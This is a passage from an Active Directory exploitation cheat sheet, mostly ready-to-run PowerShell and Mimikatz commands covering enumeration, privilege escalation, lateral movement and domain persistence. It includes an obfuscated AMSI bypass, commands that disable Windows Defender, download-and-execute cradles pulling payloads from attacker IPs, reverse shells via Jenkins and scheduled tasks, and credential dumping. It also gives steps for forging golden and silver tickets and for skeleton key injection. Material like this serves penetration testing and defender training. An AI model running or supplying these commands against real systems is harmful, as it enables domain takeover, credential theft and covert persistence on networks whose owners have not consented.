# Active Directory Exploitation Cheat Sheet

Overview
---------
- [Powershell Introduction](#powershell-introduction)
- [Domain Enumeration](#domain-enumeration)
- [Local Privilege Escalation](#local-privilege-escalation)
- [Lateral Movement](#lateral-movement)
- [Domain Persistence](#domain-persistence)
- [Domain Privilege Escalation](#domain-privilege-escalation)
- [Cross Forest Attacks](#cross-forest-attacks)
- [Forest Persistence](#forest-persistence)

PowerShell Introduction
-----------------------------------------

### PowerShell Basics

- Import a module

```
PS C:\> Import-Module <modulepath>
```

- List all the commands in a module

```
PS C:\> Get-Command -Module <modulename>
```

- Dot-source a PowerShell script

```
PS C:\> . .\PowerView.ps1
```

- Copy a file using PowerShell

```
PS C:\> Copy-Item .\<local file> \\<hostname>\c$\'Program Files'
OR
PS C:\> Copy-Item -ToSession $sess -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\appadmin\Downloads
```

- Download a file using PowerShell

```
PS C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP address>/exploit.exe','C:\Users\Public\Desktop\new-exploit.exe')"
```

### PowerShell Scripts: Execution Policy, AMSI, Windows Defender, AppLocker, and Language Modes

- Bypass the PowerShell execution policy feature

```
PS C:\> powershell -ExecutionPolicy bypass
OR
PS C:\> powershell -c <cmd>
OR
PS C:\> powershell -encodedcommand
OR
PS C:\> $env:PSExecutionPolicyPreference="bypass"
```

- Bypass AMSI

```
PS C:\> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
OR
PS C:\> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

- Disable Windows Defender

```
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true
```

- Disable IOAV Protection

```
PS C:\> Set-MpPreference -DisableIOAVProtection $true
```

- Check the AppLocker policy (look for exempted binaries or paths to bypass)

```
PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

- Check the language mode

```
PS C:\> $ExecutionContext.SessionState.LanguageMode
```

### PowerShell Script Execution

- Download and execute a PowerShell script in memory

```
PS C:\> iex (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
OR
PS C:\> $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://<IP address>/exploit.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
OR
PS C:\> iex (iwr 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')        # PSv3 onwards
OR
PS C:\> iex (iwr 'http://<IP address>/Invoke-Mimikatz.ps1' -UseBasicParsing)
OR
PS C:\> $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',$false);$h.send();iex $h.responseText
OR
PS C:\> $wr = [System.NET.WebRequest]::Create("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
PS C:\> $r = $wr.GetResponse() 
PS C:\> IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

Domain Enumeration
-----------------------------------------

### PowerView

- PowerView link

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

- Enumerate current domain

```
PS C:\> Get-NetDomain
PS C:\> Get-NetDomain -Domain <Domain Name>        # Enumerate another domain
```

- Enumerate domain SID

```
PS C:\> Get-DomainSID
```

- Enumerate domain policy

```
PS C:\> Get-DomainPolicy
PS C:\> (Get-DomainPolicy)."System Access"        # Password policy
PS C:\> (Get-DomainPolicy)."Kerberos Policy"        # Kerberos policy - smart idea to enumerate this before golden ticket attack
PS C:\> (Get-DomainPolicy -Domain <Domain Name>)."System Access"        # Enumerate another domain
```

- Enumerate domain controllers

```
PS C:\> Get-NetDomainController
PS C:\> Get-NetDomainController -Domain <Domain Name>        # Enumerate another domain
```

- Enumerate users

```
PS C:\> Get-NetUser
PS C:\> Get-NetUser | select samaccountname
PS C:\> Get-NetUser -Username <username>
PS C:\> Get-NetUser -Username <username> -Domain <Domain Name>        # Enumerate another domain
```

- Enumerate list of all properties for users

```
PS C:\> Get-UserProperty
PS C:\> Get-UserProperty -Properties pwdlastset        # Check last password change
PS C:\> Get-UserProperty -Properties badpwdcount        # Look for 0 - this may be a decoy or honeypot user
PS C:\> Get-UserProperty -Properties logoncount        # Check logon counts - this may be a decoy or honeypot user
```

- Search for a particular string in a user's attributes

```
PS C:\> Find-UserField -SearchField Description -SearchTerm "built"
```

- Enumerate computers

```
PS C:\> Get-NetComputer
PS C:\> Get-NetComputer -FullData
PS C:\> Get-NetComputer -FullData | select operatingsystem
PS C:\> Get-NetComputer -OperatingSystem "*Server 2016*"
PS C:\> Get-NetComputer -Ping        # Enumerate machines that respond to ping
```

- Enumerate groups

```
PS C:\> Get-NetGroup
PS C:\> Get-NetGroup -FullData
PS C:\> Get-NetGroup -GroupName "Domain Admins" -FullData        # Enumerate a specific group
PS C:\> Get-NetGroup -GroupName *admin*        # List groups containing the word "admin" in group name
PS C:\> Get-NetGroup -Domain <Domain Name>        # Enumerate another domain

# Only the forest root domain contains the Enterprise Admins and Schema Admins groups. The first domain that you deploy in an Active Directory forest is called the forest root domain. This domain remains the forest root domain for the life cycle of the AD DS deployment.
```     

- Enumerate group members

```
PS C:\> Get-NetGroupMember -GroupName "Domain Admins"
PS C:\> Get-NetGroupMember -GroupName "Domain Admins" -Recurse        # Enumerate group members of the Domain Admins group
PS C:\> Get-NetGroupMember -GroupName "Enterprise Admins" -Domain <Domain Name> -Recurse        # Enumerate another domain
PS C:\> Get-NetGroup -UserName "<username>"        # Enumerate the group membership for a user
```

- Enumerate local groups

```
PS C:\> Get-NetLocalGroup -ComputerName <computer name> -ListGroups        # List local groups on a machine (needs administrator privileges on non-DC machines)
PS C:\> Get-NetLocalGroup -ComputerName <computer name> -Recurse        # Enumerate members of all the local groups on a machine (needs administrator privileges on non-DC machines)
```

- Enumerate logged-on users

```
PS C:\> Get-NetLoggedon -ComputerName <computer name>        # Get actively logged users on a computer (needs local admin rights on the target)
PS C:\> Get-LoggedonLocal -ComputerName <computer name>        # Get locally logged users on a computer (needs remote registry on the target - started by default on server OS)
PS C:\> Get-LastLoggedon -ComputerName <computer name>      # Get the last logged user on a computer (needs admin rights and remote registry on the target)
PS C:\> Get-NetSession -ComputerName <computer name>        # Get session information for a machine
```

- Enumerate shares

```
PS C:\> Invoke-ShareFinder
PS C:\> Invoke-ShareFinder -Verbose
PS C:\> Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC 
```

- Enumerate sensitive files

```
PS C:\> Invoke-FileFinder -Verbose
```

- Enumerate fileservers (considered high-value targets in a domain)

```
PS C:\> Get-NetFileServer
```

- Enumerate group policies (GPO)

```
PS C:\> Get-NetGPO
PS C:\> Get-NetGPO | select displayname
PS C:\> Get-NetGPO -ComputerName <computer name>        # Enumerate another computer 
PS C:\> Get-NetGPOGroup        # Get GPO(s) which use Restricted Groups or groups.xml for interesting users
PS C:\> Find-GPOComputerAdmin -Computername <computer name>        # Get users which are in a local group of a machine using GPO
PS C:\> Find-GPOLocation -UserName <username> -Verbose         # Get machines where the given user is member of a specific group
```

- Enumerate organizational units (OUs)

```
PS C:\> Get-NetOU
PS C:\> Get-NetOU -FullData
PS C:\> Get-NetOU <OU name> | %{Get-NetComputer -ADSPath $_}        # List all the computers in an OU
```

- Emumerate GPO applied on an OU

```
PS C:\> Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-83E8F4EF8081}"        # Enumerate GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
OR
PS C:\> Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=test,DC=domain,DC=local'
```

- Enumerate access control lists (ACLs) (List of access control entries (ACE) = ACE corresponds to individual permission or audit access)

```
PS C:\> Get-ObjectAcl -SamAccountName <object> -ResolveGUIDs        # Get the ACLs with the specified object (3 most important properties: ObjectDN = target object we specified, IdentityReference = which object has permissions on the target, ActiveDirectoryRights = what rights they have. Other interesting properties are: InheritedObjectType, AccessControlType, InheritanceFlags, ObjectSID)
PS C:\> Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose        # Enumerate the ACLs associated with the specified prefix to be used for search
PS C:\> Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=test,DC=domain,DC=local" -ResolveGUIDs -Verbose        # Enumerate the ACLs associated with the specified LDAP path to be used for search for the specified object
PS C:\> Get-PathAcl -Path "\\test-dc.test.domain.local\sysvol"        # Enumerate the ACLs associated with the specified path
```

- Search for interesting ACEs (write or modify rights/permissions)

```
PS C:\> Invoke-ACLScanner -ResolveGUIDs
PS C:\> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "<object>"}        # On a specified object
```

- Enumerate ACLs for all the GPOs

```
PS C:\> Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
PS C:\> Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}  | ?{$_.IdentityReference -match "<object>"}        # On a specified object
```

- Enumerate a list of all domain trusts in the current domain

```
PS C:\> Get-NetDomainTrust
PS C:\> Get-NetDomainTrust -Domain <Domain Name>        # Enumerate another domain
PS C:\> Get-NetForestDomain -Verbose | Get-NetDomainTrust        # Map all the domain trusts of the current forest
PS C:\> Get-NetForestDomain -Forest <Forest Name> -Verbose | Get-NetDomainTrust        # Map all the domain trusts of another forest
```

- Enumerate current forest

```
PS C:\> Get-NetForest
PS C:\> Get-NetForest -Forest <Forest Name>                 # Enumerate another forest
```

- Enumerate domains in the current forest

```
PS C:\> Get-NetForestDomain
PS C:\> Get-NetForestDomain -Forest <Forest Name>        # Enumerate another forest
```

- Enumerate global catalogs in the current forest

```
PS C:\> Get-NetForestCatalog
PS C:\> Get-NetForestCatalog -Forest <Forest Name>        # Enumerate another forest
```

- Enumerate forest trusts

```
PS C:\> Get-NetForestTrust
PS C:\> Get-NetForestTrust -Forest <Forest Name>            # Enumerate another forest
```

- User hunting

*Can also use Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1*

```
PS C:\> Find-LocalAdminAccess -Verbose        # Find all machines on the current domain where the current user has local admin access
PS C:\> Invoke-EnumerateLocalAdmin -Verbose        # Find local admins on all machines of the domain (needs administrator privileges on non-DC machines)
PS C:\> Invoke-UserHunter        # Find computers where a domain admin (or specified user/group) has sessions
PS C:\> Invoke-UserHunter -GroupName "RDPUsers"
PS C:\> Invoke-UserHunter -CheckAccess        # To confirm admin access
PS C:\> Invoke-UserHunter -Stealth        # Targets high traffic servers e.g. DC, File Servers, Distributed File Servers
```

### ActiveDirectory (AD) Module

- ActiveDirectory (AD) Module links

https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2019-ps
https://github.com/samratashok/ADModule

*You can copy this DLL to your machine and use it to enumerate Active Directory without installing RSAT and without having administrative privileges. To be able to list all the cmdlets in the module, import the module as well. Remember to import the DLL first.*

```
PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
PS C:\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1
```

*You can also use the Import-ActiveDirectory.ps1 to load the script using download-execute cradles and without writing the DLL to disk:*

```
PS C:\> iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

- Enumerate current domain

```
PS C:\> Get-ADDomain
PS C:\> Get-ADDomain -Identity <Domain Name>        # Enumerate another domain
```

- Enumerate domain SID

```
PS C:\> (Get-ADDomain).DomainSID
```

- Enumerate domain controllers

```
PS C:\> Get-ADDomainController
PS C:\> Get-ADDomainController -DomainName <Domain Name> -Discover        # Enumerate another domain
```

- Enumerate users

```
PS C:\> Get-ADUser -Filter *
PS C:\> Get-ADUser -Filter * -Properties *
PS C:\> Get-ADUser -Filter * -Properties * | select Name
PS C:\> Get-ADUser -Identity <username> -Properties *
PS C:\> Get-ADUser -Server <Domain Controller>
```

- Enumerate list of all properties for users

```
PS C:\> Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
PS C:\> Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```

- Search for a particular string in a user's attributes

```
PS C:\> Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
```

- Enumerate computers

```
PS C:\> Get-ADComputer -Filter *
PS C:\> Get-ADComputer -Filter * -Properties *
PS C:\> Get-ADComputer -Filter * | select Name
PS C:\> Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
PS C:\> Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}        # Enumerate machines that respond to ping
```

- Enumerate groups

```
PS C:\> Get-ADGroup -Filter *
PS C:\> Get-ADGroup -Filter * -Properties *
PS C:\> Get-ADGroup -Filter * | select Name
PS C:\> Get-ADGroup -Filter 'Name -like "*admin*"' | select Name        # List groups containing the word "admin" in group name
```

- Enumerate group members

```
PS C:\> Get-ADGroupMember -Identity "Domain Admins"
PS C:\> Get-ADGroupMember -Identity "Domain Admins" -Recursive        # Enumerate group members of the Domain Admins group
PS C:\> Get-ADGroupMember -Identity "Enterprise Admins" -Server "<Domain Name>" -Recursive     # Enumerate another domain
PS C:\> Get-ADPrincipalGroupMembership -Identity <username>        # Enumerate the group membership for a user
```

- Enumerate organizational units (OUs)

```
PS C:\> Get-ADOrganizationalUnit -Filter * -Properties *
```

- Enumerate access control lists (ACLs) (List of access control entries (ACE) = ACE corresponds to individual permission or audit access)

```
PS C:\> (Get-Acl 'AD:\CN=Administrator,CN=Users,DC=test,DC=domain,DC=local').Access        # Enumerate ACLs without resolving GUIDs
```

- Enumerate a list of all domain trusts in the current domain

```
PS C:\> Get-ADTrust
PS C:\> Get-ADTrust -Identity <Domain Name>        # Enumerate another domain
```

- Enumerate current forest

```
PS C:\> Get-ADForest
PS C:\> Get-ADForest -Identity <Forest Name>        # Enumerate another forest
```

- Enumerate domains in the current forest

```
PS C:\> (Get-ADForest).Domains
```

- Enumerate global catalogs in the current forest

```
PS C:\> Get-ADForest | select -ExpandProperty GlobalCatalogs
```

- Enumerate forest trusts

```
PS C:\> Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```

### BloodHound

- BloodHound link

https://github.com/BloodHoundAD/BloodHound<br>
https://github.com/BloodHoundAD/SharpHound - C# rewrite

- Supply data to BloodHound using powershell module ingestor

```
PS C:\> . .\SharpHound.ps1
PS C:\> Invoke-BloodHound -CollectionMethod All
PS C:\> Invoke-BloodHound -CollectionMethod All -ExcludeDC        # To avoid detections like ATA
PS C:\> Invoke-BloodHound -CollectionMethod LoggedOn        # In case BloodHound doesn't find any Sessions in Database Info
```

- Install neo4j

```
PS C:\> neo4j.bat install-service
PS C:\> neo4j.bat start
```

Local Privilege Escalation
-----------------------------------------

### Privilege Escalation Methods

- List of ways to locally escalate privileges on a Windows box

```
- Hunting for local admin access on other machines
- Hunting for high privilege domain accounts (like Domain Admins)
- Missing patches
- Automated deployment and AutoLogon passwords in clear text
- AlwaysInstallElevated (Any user can run MSI as SYSTEM)
- Misconfigured services
- DLL hijacking
- Token impersonation
```

- Privilege escalation tool links

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1<br>
https://github.com/AlessandroZ/BeRoot<br>
https://github.com/enjoiz/Privesc

### PowerUp

- Get services with unquoted paths and a space in their executable path

```
PS C:\> Get-ServiceUnquoted -Verbose
```

- Get services where the current user can write to its binary path or change arguments to the binary

```
PS C:\> Get-ModifiableServiceFile -Verbose
```

- Get services where the current user can modify their configuration

```
PS C:\> Get-ModifiableService -Verbose
```

- Abuse a function the current user has configuration rights on in order to add a local administrator or execute a custom command

```
PS C:\> Invoke-ServiceAbuse -Name '<weak service name>' -UserName '<username>' -Verbose
OR
PS C:\> Invoke-ServiceAbuse -Name '<weak service name>' -Command "net localgroup administrators <username> /add" -Verbose
```

- Run all checks (make sure to check AbuseFunction field to see examples of exploitation)

```
PS C:\> Invoke-AllChecks
```

### BeRoot

- Run all checks

```
PS C:\> .\beRoot.exe
```

### Privesc

- Run all checks

```
PS C:\> Invoke-PrivEsc
```

### Feature Abuse - Jenkins

- Execute a command on a Jenkins Master using Groovy scripts

```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '<INSERT COMMAND>'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $ sout err> $serr"
```

- Execute a command on a Jenkins Master using build configuration

```
powershell.exe iex (iwr http://<Attacker IP address>/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Power -Reverse -IPAddress <Attacker IP address> -Port <port>
OR
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<Attacker IP address>/Invoke-PowerShellTcp.ps1')); Power -Reverse -IPAddress <Attacker IP address> -Port <port>
```

Set up a PowerCat listener (press Enter a few times to connect to reverse shells)

```
PS C:\> powercat -l -v -p <port> -t 100
```

Lateral Movement
-----------------------------------------

### PowerShell Remoting

- Enable PowerShell Remoting on current machine (needs admin access)

```
PS C:\> Enable-PSRemoting
```

- Start an interactive session with a remote computer using PowerShell remoting (needs admin access on the remote computer)

```
PS C:\> Enter-PSSession -ComputerName <computer name>
PS C:\> Enter-PSSession -ComputerName <computer name> -Credential <Domain>\<Username>        # Specify credentials
```

- Create a persistent connection to a local or remote computer using PowerShell remoting (needs admin access on the remote computer)

```
PS C:\> $sess = New-PSSession -ComputerName <computer name>
PS C:\> $sess
PS C:\> Enter-PSSession -Session $sess
```

- Execute commands or scriptblocks on a remote computer

```
PS C:\> Invoke-Command -ScriptBlock {whoami} -ComputerName <computer name>
PS C:\> Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content <server-list.txt>)        # Run a command on multiple systems
PS C:\> Invoke-Command -ScriptBlock {whoami} -Session $sess        # Import a command into a session
```

- Execute scripts from files on a remote computer

```
PS C:\> Invoke-Command -FilePath C:\Scripts\Get-PassHashes.ps1 -ComputerName <computer name>
PS C:\> Invoke-Command -FilePath C:\Scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <server-list.txt>)        # Run a command on multiple systems
PS C:\> Invoke-Command -FilePath C:\Scripts\Get-PassHashes.ps1 -Session $sess        # Import a script into a session
```
- Execute locally loaded functions on a remote computer

```
PS C:\> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName <computer name>
PS C:\> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <server-list.txt>)        # Run a command on multiple system
PS C:\> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <server-list.txt>) -ArgumentList        # To pass arguments. Only positional arguments can be passed this way
PS C:\> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -Session $sess        # Import a locally loaded function into a session
```

- Execute stateful commands on a remote computer

```
PS C:\> $sess = New-PSSession -ComputerName <computer name>
PS C:\> Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
PS C:\> Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
```

### Mimikatz

- Dump credentials on a local machine (needs administrative privileges)

```
PS C:\> Invoke-Mimikatz -DumpCreds
```

- Dump certificates on a local machine (needs administrative privileges)

```
PS C:\> Invoke-Mimikatz -DumpCerts
```

- Dump credentials on multiple remote machines (needs administrative privileges)

```
PS C:\> Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
```

- Dump AES keys (needs administrative privileges)

```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

- Dump credentials from the credentials vault e.g. scheduled task credentials (needs administrative privileges)

```
PS C:\> Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```

- Overpass The Hash (Generate tokens from hashes) - make sure to run PowerShell as Administrator

```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:<Domain Name> /ntlm:<NTLM hash> /run:powershell.exe"'
```

- Check if the new PowerShell session is running with elevated privileges (whoami will not show this)

```
PS C:\> Invoke-Command -ScriptBlock {whoami} -ComputerName <Domain Controller>
```

### Token Manipulation

- List all the tokens on a machine

```
PS C:\> Invoke-TokenManipulation -ShowAll
```

- List all unique, useable tokens on a machine

```
PS C:\> Invoke-TokenManipulation -Enumerate
```

- Start a new process with token of a specific user

```
PS C:\> Invoke-TokenManipulation -ImpersonateUser -Username "<Domain>\<username>"
```

- Start a new process with token of another process

```
PS C:\> Invoke-TokenManipulation -CreateProcess "C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.exe -ProcessId 500
```

Domain Persistence
-----------------------------------------

### Golden Ticket

- Execute Mimikatz on DC as Domain Admin to get krbtgt hash

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <Domain Controller>
```

- Use the DCSync feature as Domain Admin to get the krbtgt hash (no need to run Invoke-Mimikatz on the target DC)

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:test\krbtgt"'
```

- Use Mimikatz to craft a golden ticket

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:<username for which the TGT is generated> /domain:<Domain FQDN> /sid:<Domain SID> /krbtgt:<NTLM (RC4) hash of the krbtgt account. Use /aes128 and /aes256 for using AES keys> id:<optional User RID (default 500)> /groups:<optional Group 513, 512, 520, 518, 519> /startoffset:<optional when the ticket is available (default 0 right now) in minutes. Use negative for a ticket available from past and a larger number for future> /endin:<optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes> /renewmax:<optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800> /ptt"'
```

- Confirm we have access to the Domain Controller as Administrator

```
PS C:\> ls \\<Domain Controller>\c$
```

### Silver Ticket

- Use Mimikatz to craft a silver ticket

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:<username for which the TGS is generated> /domain:<Domain FQDN> /sid:<Domain SID> /target:<target server FQDN> /service:<The SPN name of service for which the TGS is to be created> /rc4:<NTLM (RC4) hash of the service account. Use /aes128 and /aes256 for using AES keys> /ptt"'
```

- Use Mimikatz to craft a silver ticket for the CIFS SPN which will allow us to access the file system on the target

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain Name> /sid:<Domain SID> /target:<target> /service:CIFS /rc4:<NTLM (RC4) hash of the service account> /ptt"'
```

- Use Mimikatz to craft a silver ticket for the HOST SPN which will allow us to schedule a task on the target

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain Name> /sid:<Domain SID> /target:<target> /service:HOST /rc4:<NTLM (RC4) hash of the service account> /ptt"'
```

- Scheule and execute a task (make sure to edit Invoke-PowerShellTcp.ps1 and add a function call down the bottom on the file: Power -Reverse -IPAddress 172.16.100.60 -Port 443)

```
PS C:\> schtasks /create /S <target> /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"

PS C:\> schtasks /Run /S <target> /TN "STCheck"        # To run the scheduled task
```

### Skeleton Key

- Use Mimikatz to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice (requires Domain Admin privileges)

```
PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <Domain Controller>
```

- Access any machine with a valid username and enter the password as "mimikatz" (can access other machines as long as they authenticate with the Domain Controller which has been patched and the Domain Controller is not rebooted)

```
PS C:\> Enter-PSSession -ComputerName <computer name> -Credential <Domain>\Administrator
```

- Install the Mimikatz driver (mimidriv.sys) on disk of the target Domain Controller who is running LSASS as a protected process

```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

### Directory Services Restore Mode (DSRM)

- Dump DSRM password (need Domain Admin privileges)

```
PS C:\> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <Domain Controller>
```

- Compare the Administrator hash above with the Administrator hash of below command (first one is the DSRM local Administrator)

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <Domain Controller>
```

- Change the logon behaviour for the DSRM account before we can pass the hash and authenticate (since this is the local administrator of the Domain Controller, we can pass the hash to authenticate)

```
PS C:\> Enter-PSSession -ComputerName <Domain Controller>
PS C:\> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Verbose
PS C:\> Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose        # if the property already exists
```

- Use Mimikatz to pass the DSRM hash - make sure to run PowerShell as Administrator

```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<Domain Controller name> e.g. test-dc> /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

PS C:\> ls \\test-dc.test.domain.local\c$
```

### Custom Security Support Provider (SSP)

- Drop the mimilib.dll to system32, and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages

```
PS C:\> $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
PS C:\> $packages += "mimilib"
PS C:\> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
PS C:\> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

- Use Mimikatz to inject into LSASS (not stable with Server 2016)

```
PS C:\> Invoke-Mimikatz -Command '"misc::memssp"'
```

### AdminSDHolder (Persistence using ACLs)

- Add FullControl permissions for a user to the AdminSDHolder using PowerView as Domain Admin

```
PS C:\> Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName <username> -Rights All -Verbose
```

- Add ResetPassword permissions for a user to the AdminSDHolder using PowerView as Domain Admin

```
PS C:\> Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName <username> -Rights ResetPassword -Verbose
```

- Add WriteMembers permissions for a user to the AdminSDHolder using PowerView as Domain Admin

```
PS C:\> Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName <username> -Rights WriteMembers -Verbose
```

- Add FullControl permissions for a user to the AdminSDHolder using ActiveDirectory Module and Set-ADACL as Domain Admin

```
PS C:\> Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=test,DC=domain,DC=local' -Principal <username> -Verbose
```

- Run SDProp manually using Invoke-SDPropagator.ps1

```
PS C:\> Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

PS C:\> Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose        # For pre-Server 2008 machines
```

- Check the Domain Admins permission using PowerView as normal user

```
PS C:\> Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match '<username>'}
```

- Check the Domain Admins permission using ActiveDirectory Module as normal user

```
PS C:\> (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=test,DC=domain,DC=local').Access | ?{$_.IdentityReference -match '<username>'}
```

- Abuse FullControl by adding a user to the Domain Admins group using PowerView_dev

```
PS C:\> Add-DomainGroupMember -Identity 'Domain Admins' -Members <username> -Verbose
```

- Abuse FullControl by adding a user to the Domain Admins group using ActiveDirectory Module

```
PS C:\> Add-ADGroupMember -Identity 'Domain Admins' -Members <username>
```

- Abuse ResetPassword by resetting a users password using PowerView_dev

```
PS C:\> Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString "<new-password>" -AsPlainText -Force) -Verbose
```

- Abuse ResetPassword by resetting a users password using ActiveDirectory Module

```
